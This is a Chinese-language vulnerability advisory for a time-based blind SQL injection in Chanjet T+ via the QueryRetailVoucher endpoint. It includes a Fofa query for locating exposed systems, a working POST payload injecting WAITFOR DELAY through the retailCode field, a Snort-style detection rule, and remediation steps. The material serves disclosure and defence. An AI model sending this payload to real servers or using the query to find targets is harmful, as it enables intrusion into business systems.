# 畅捷通T+ POSSyncService QueryRetailVoucher存在SQL注入漏洞

畅捷通T+ POSSyncService QueryRetailVoucher存在SQL注入漏洞

# 影响版本

**畅捷通T+ &lt; 16.0**

# **漏洞状态**

|**漏洞细节**|**漏洞POC**|**漏洞EXP**|**在野利用**|
| :-: | :-: | :-: | :-: |
|**是**|**已公开**|**已公开**|**已知**|

## 风险等级

|**维度**|**评价**|
| :-: | :-: |
|**威胁等级**|**高危**|
|**影响面**|**广**|
|**攻击者价值**|**高**|
|**利用难度**|**低**|

# 漏洞复现

**Fofa:**  **app=&quot;畅捷通-TPlus&quot;**

**POC/EXP：**

**step1** **延时注入测试**

```
POST /tplus/POSSyncService.asmx/QueryRetailVoucher HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: length

accNum=1&posNum=1&key=qwe&idStore=1&retailCode=1';WAITFOR DELAY '0:0:5'--
```

​![image](assets/image-20260901232922-x5falpv.png)​

**sonrt规则：**

```
alert tcp any any -> $HOME_NET any (
    msg:"畅捷通T+ - /tplus/POSSyncService.asmx/QueryRetailVoucher SQL注入漏洞 (Time-based Blind)";
    flow:to_server,established;
    http.method; content:"POST";
    http.uri; content:"/tplus/POSSyncService.asmx/QueryRetailVoucher"; fast_pattern;
    http.content_type; content:"application/x-www-form-urlencoded";
    http.request_body; content:"retailCode="; nocase;
    http.request_body; pcre:"/WAITFOR\s+DELAY/i";
    metadata:
        service http,
        affected_product "畅捷通T+",
        vulnerability_type "SQL Injection (Time-based)",
        severity "critical";
    classtype:web-application-attack;
    sid:1000738;
    rev:1;
    priority:1;
)
```

# 漏洞修复

* **首选方案：版本升级**

  1. **升级到最新版本**：最彻底的修复方案是将系统升级到**T+ 18.0及以上版本**或**专属云T+ 19.0版本**。
  2. **安装安全补丁**：如果无法立即进行大版本升级，应联系服务商获取针对当前版本的漏洞修复补丁。对于13.0版本，官方建议将补丁升级至 **​`13.000.001.0404`​**​ **（2023-02-23发布）或以上版本**。
* **临时缓解措施（升级前的应急措施）**

  1. **限制网络访问**：在防火墙上设置策略，**严格限制对**  **​`/tplus/POSSyncService.asmx`​**​ **接口的访问**，仅允许可信IP进行连接。
  2. **部署WAF规则**：在Web应用防火墙（WAF）上配置规则，**拦截对上述接口的异常请求**，特别是包含SQL注入特征的请求。
  3. **加强监控与审计**：**检查系统日志**，排查是否存在针对该接口的可疑访问记录。同时，安装部署EDR类软件，监测服务器异常行为。

‍
